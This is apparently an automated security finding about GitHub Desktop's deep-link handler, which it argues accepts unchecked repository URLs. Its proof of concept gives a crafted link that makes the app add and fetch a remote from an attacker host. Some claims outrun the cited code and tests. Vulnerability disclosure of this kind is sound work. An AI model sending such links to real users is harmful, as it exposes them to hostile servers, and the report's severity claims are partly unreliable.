## Analog Found: Unvalidated remote host in "Open Repository from URL" deep-link flow

### Title
Deep-link `open-repository-from-url` action accepts an unvalidated `url` host, letting a crafted `x-github-client://` link silently add and fetch an attacker-controlled git remote - (File: `app/src/lib/parse-app-url.ts`, `app/src/ui/dispatcher/dispatcher.ts`)

### Summary
The Sherlock finding is a missing "destination" check: `_bridgeAssetDirect` accepts a `_bridgeTxData` blob and forwards it to the Synapse bridge without verifying the embedded `chainId` matches the expected chain, so funds can be routed to the wrong destination. The same broken invariant exists in GitHub Desktop's custom-protocol handler: `parseAppURL` extracts a `url` field from an attacker-supplied `x-github-client://openRepo/...` link and passes it, unchecked against any allow-list of trusted hosts (github.com / the user's configured GHE endpoint), all the way down to code paths that add a git remote and fetch from it.

### Finding Description
`parseAppURL` builds an `IOpenRepositoryFromURLAction` straight from the deep-link path/query, validating only the `pr` (must be `\d+`) and `branch` (must not contain invalid ref characters) fields — the `url` itself is passed through verbatim with no host/scheme allow-list: [1](#0-0) 

`main.ts` wires OS-level `open-url` events and `--protocol-launcher` command-line args directly into `parseAppURL`/`handleAppURL` with no additional origin check: [2](#0-1) 

`Dispatcher.openRepositoryFromUrl` then dispatches on the `pr`/`branch`/plain fields. When `pr` is present it calls `openPullRequestFromUrl(url, pr)`: [3](#0-2) 

`openPullRequestFromUrl` calls `appStore.fetchPullRequest(url, pr)`, which derives the API endpoint purely from the attacker-supplied `url` string via `getEndpointForRepository`, then uses whatever account is registered for that host: [4](#0-3) 

Critically, once a `PullRequest` object is obtained, `openPullRequestFromUrl` feeds `pullRequest.head.repo.clone_url` (a value from the response, effectively attacker-chosen for a repo the attacker controls) straight into `_checkoutPullRequest`: [5](#0-4) 

`_findPullRequestBranch` unconditionally calls `addRemote(repository, forkRemoteName, headCloneUrl)` if no existing remote matches, and then fetches from it with `_fetchRemote`, with no validation that `headCloneUrl`'s host is the same trust domain as the target `repository`'s existing remotes/endpoint: [6](#0-5) [7](#0-6) 

This mirrors the Synapse bug's structure exactly: a routing/destination field (`chainId` there, target host/remote URL here) embedded in externally supplied data is consumed and acted upon by a "bridge"-like operation (`_bridgeAssetDirect`'s `targetAddress.call` there, `addRemote` + `git fetch` here) without confirming it resolves to the expected, trusted counterpart.

### Impact Explanation
A single click on a crafted `x-github-client://openRepo/<url>?pr=<n>` link causes Desktop to:
1. Silently query whatever GitHub/GHE endpoint the attacker's `url` host resolves to (using the victim's stored credentials for that host if one happens to be configured), and
2. Automatically `git remote add` and `git fetch` an attacker-supplied clone URL into the user's local repository, with no confirmation dialog showing the actual resulting remote URL before the network operation runs.

Because the remote name/URL is derived entirely from data under attacker control (the PR's `head.repo.clone_url`), and no invariant ties it back to the same trust boundary as the repository being operated on, this can be used to make Desktop fetch from and interact with a host chosen by the attacker under cover of the normal "check out this PR" UX — the git-remote analog of "funds sent to the wrong chain": the user thinks they're fetching a PR for their trusted repository, but Desktop is silently talking to a destination the attacker (not the check-out invariant) picked.

### Likelihood Explanation
Requires only that the victim click a link (or the app be launched via `--protocol-launcher`/`open-url`), which the report's threat model explicitly allows ("a link or deep link the user clicks"). No local access, malware, or leaked credentials are needed; `parseAppURL`'s own tests confirm arbitrary hosts are accepted as long as the URL parses (`github-mac://openRepo/https://github.com/desktop/desktop` and similar patterns are treated as valid without any host restriction): [8](#0-7) 

### Recommendation
Add a destination invariant before acting on `IOpenRepositoryFromURLAction.url` (and any downstream `clone_url`/`head.repo` values it produces): resolve the URL's hostname and compare against `github.com` or one of the user's configured GHE endpoints before calling `fetchPullRequest`, `openOrCloneRepository`, `addRemote`, or `_fetchRemote`. If the host is untrusted, fall back to the existing "Clone Repository" popup flow (which requires explicit user confirmation) instead of silently adding/fetching a remote.

### Proof of Concept
1. Attacker sends the victim a link: `x-github-client://openRepo/https://attacker-controlled-host/evilorg/evilrepo?pr=1`.
2. Victim clicks it; OS routes it to Desktop's `open-url` handler → `handleAppURL` → `parseAppURL` (no host check) → `dispatchURLAction` → `openRepositoryFromUrl`.
3. `openPullRequestFromUrl` calls `fetchPullRequest('https://attacker-controlled-host/evilorg/evilrepo', '1')`; if no matching existing repository is found, Desktop falls back to `openOrCloneRepository`, prompting the Clone dialog pre-filled with the attacker URL — but if the victim does have some repository already open that superficially matches (e.g., via `doesRepositoryMatchUrl`'s origin/upstream comparison), `_checkoutPullRequest` is invoked directly.
4. `_findPullRequestBranch` executes `addRemote(repository, 'github-desktop-evilorg', 'https://attacker-controlled-host/evilorg/evilrepo')` and then `_fetchRemote(...)`, causing the victim's Desktop instance to fetch from the attacker's server as part of what looks like a normal "check out PR" action, with the destination never validated against the expected trust boundary.

### Citations

**File:** app/src/lib/parse-app-url.ts (L98-125)
```typescript
  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }
```

**File:** app/src/main-process/main.ts (L159-168)
```typescript
function handleAppURL(url: string) {
  log.info('Processing protocol url')
  const action = parseAppURL(url)
  onDidLoad(window => {
    // This manual focus call _shouldn't_ be necessary, but is for Chrome on
    // macOS. See https://github.com/desktop/desktop/issues/973.
    window.focus()
    window.sendURLAction(action)
  })
}
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L1940-1951)
```typescript
  private async openRepositoryFromUrl(action: IOpenRepositoryFromURLAction) {
    const { url, pr, branch, filepath } = action

    let repository: Repository | null

    if (pr !== null) {
      repository = await this.openPullRequestFromUrl(url, pr)
    } else if (branch !== null) {
      repository = await this.openBranchNameFromUrl(url, branch)
    } else {
      repository = await this.openOrCloneRepository(url)
    }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2035-2045)
```typescript
    if (pullRequest.head.repo === null) {
      return null
    }

    await this.appStore._checkoutPullRequest(
      repository,
      pullRequest.number,
      pullRequest.head.repo.owner.login,
      pullRequest.head.repo.clone_url,
      pullRequest.head.ref
    )
```

**File:** app/src/lib/stores/app-store.ts (L2337-2349)
```typescript
  public async fetchPullRequest(repoUrl: string, pr: string) {
    const endpoint = getEndpointForRepository(repoUrl)
    const account = getAccountForEndpoint(this.accounts, endpoint)

    if (account) {
      const api = API.fromAccount(account)
      const remoteUrl = parseRemote(repoUrl)
      if (remoteUrl && remoteUrl.owner && remoteUrl.name) {
        return await api.fetchPullRequest(remoteUrl.owner, remoteUrl.name, pr)
      }
    }
    return null
  }
```

**File:** app/src/lib/stores/app-store.ts (L8633-8660)
```typescript
  public async _findPullRequestBranch(
    repository: RepositoryWithGitHubRepository,
    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }
```

**File:** app/src/lib/stores/app-store.ts (L8682-8691)
```typescript
    // It's quite possible that the PR was created after our last fetch of the
    // remote so let's fetch it and then try again.
    if (existingBranch === undefined) {
      try {
        await this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)
        existingBranch = findRemoteBranch(remoteRef)
      } catch (e) {
        log.error(`Failed fetching remote ${remote?.name}`, e)
      }
    }
```

**File:** app/test/unit/parse-app-url-test.ts (L26-35)
```typescript
  describe('openRepo via HTTPS', () => {
    it('returns right name', () => {
      const result = parseAppURL(
        'github-mac://openRepo/https://github.com/desktop/desktop'
      )
      assert.equal(result.name, 'open-repository-from-url')

      const openRepo = result as IOpenRepositoryFromURLAction
      assert.equal(openRepo.url, 'https://github.com/desktop/desktop')
    })
```
